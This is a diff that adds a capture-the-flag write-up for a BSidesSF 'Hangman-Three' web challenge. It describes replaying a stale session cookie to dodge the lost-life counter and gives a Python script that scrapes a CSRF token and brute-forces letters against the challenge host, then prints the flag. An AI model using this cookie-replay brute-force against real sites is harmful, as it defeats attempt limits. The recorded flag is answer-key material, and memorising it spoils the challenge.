@@ -544,6 +544,90 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
 -----------------
 
+### Hangman-Three
+
+------------------
+
+![image](https://github.com/user-attachments/assets/fe8f7e3d-02e5-4fd5-b096-eed4e5e5101d)
+
+------------------
+
+- It is just like hangman but you have to guess a random word per login which means we cannot create a new account to guess most of th character.
+
+![image](https://github.com/user-attachments/assets/3ec9331c-dc54-4ee7-a652-21df88471ad0)
+
+- I solved the challenge through an unintended means.I noticed that if I guess a char and it fails,the cookie sets a new cookie with `live_lost` updated to 1.What if we interact with the endpoint `/guess` solely without updating the cookie and using our single `live_lost: 0` cookie.We should be able to fuzz the word and return back to home for the flag.
+
+![image](https://github.com/user-attachments/assets/c4ad0899-dbd9-4b3b-8bb3-d7421b433a37)
+
+- I wrote a script to fuzz the characters with a `live_lost: 0` cookie and return back to endpoint `/home` to get the flag.
+
+```python3
+#! /usr/bin/env python3
+import requests
+import random
+import string
+import json
+
+def createAccount() -> tuple:
+    req = requests.Session()
+    url="https://hangman-three-464d3964.challenges.bsidessf.net/"
+    print("[+] Creating account")
+    #registering
+    username: str = ''.join(random.choices(string.ascii_lowercase,k=4))
+    password: str = ''.join(random.choices(string.ascii_lowercase,k=4))
+    register_data = {"username":username,"password":password,"confirm":password,"submit":"Register"}
+    login_data = {"username":username,"password":password,"confirm":password,"submit":"Login"}
+    req.post(url+"register",data=register_data).text
+    csrf_token = req.post(url+"login",data=login_data).text.split('<input id="csrf_token" name="csrf_token" type="hidden" value="')[1].split("\">")[0]
+    print(f"[+] csrf_token: {csrf_token}")
+    raw_cookie=req.cookies.get_dict()
+    cookie= f"access_token_cookie={raw_cookie['access_token_cookie']};session={raw_cookie['session']}"
+    print(f"Cookie is {cookie}")
+    return cookie,csrf_token
+def send_char(cookie,csrf_token,letter) -> None:
+    url="https://hangman-three-464d3964.challenges.bsidessf.net/"
+    headers = {"Referer":"https://hangman-three-464d3964.challenges.bsidessf.net/home?message=Letter:e+not+present","Cookie": cookie}
+    data = {"csrf_token":csrf_token,"letter":letter}
+    reply = requests.post(url+"guess",data=data,headers=headers,allow_redirects=False).text
+def main():
+    url = "https://hangman-three-464d3964.challenges.bsidessf.net/"
+    charset = string.ascii_lowercase + string.digits
+    cookie,csrf_token = createAccount()
+    headers = {"Cookie": cookie}
+    for i in charset:
+        send_char(cookie,csrf_token,i)
+    flag=requests.get(url+"home",headers=headers).text.split("<strong> The flag is:")[1].split(" </strong>")[0]
+    print(f"[+] Flag is {flag}")
+    
+if __name__ == "__main__":
+   main()
+```
+
+- Result-:
+
+![image](https://github.com/user-attachments/assets/3c003bbe-2105-4534-976c-9bf57b136d61)
+
+- Flag-:```CTF{hangm4nW1thW3akJWTK3y}```
+
+---------------------
+
+### Thanks for Reading
+
+----------------------
+
+### Reference:
+
+---------------------
+
+- [Xml Decoder insecure deserialization](https://github.com/mgeeky/Penetration-Testing-Tools/blob/master/web/java-XMLDecoder-RCE.md)
+
+---------------------
+
+
+
+
+
 
 
 
